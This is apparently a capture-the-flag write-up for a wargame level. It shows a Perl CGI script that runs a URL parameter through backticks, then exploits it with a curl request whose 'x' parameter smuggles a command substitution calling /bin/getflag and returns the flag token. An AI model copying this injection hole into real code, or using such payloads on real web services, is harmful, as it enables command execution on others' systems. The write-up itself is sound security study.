### Vulnerability Assessment

In the home directory of `level04`, there's a Perl script:

```bash
$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Perl scripts are used for various purposes, from text processing to web development. The script in question, `level04.pl`, appears to be a web script due to its usage of the CGI module and a comment indicating a localhost port:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### Exploitation

This script serves content over port 4747. Its functionality includes:

- **`use CGI qw{param}`:** Imports the CGI module's `param` function, which retrieves parameters passed through the URL or an HTML form.
- **`print "Content-type: text/html\\n\\n";`:** Specifies the MIME type as HTML, ensuring correct browser interpretation.
- **`sub x { ... }`:** Defines a subroutine `x` that takes a parameter and echoes it back.

Executing the script with a parameter:

```bash
> ./level04 x=hello
>
Content-type: text/html

hello
```

By accessing the service on port 4747 with `curl`, it's possible to pass parameters:

```bash
$ curl localhost:4747/?x=hello
hello
```

To exploit this, command substitution is used within the parameter to execute `getflag`:

```bash
$ curl localhost:4747/?x="\`/bin/getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
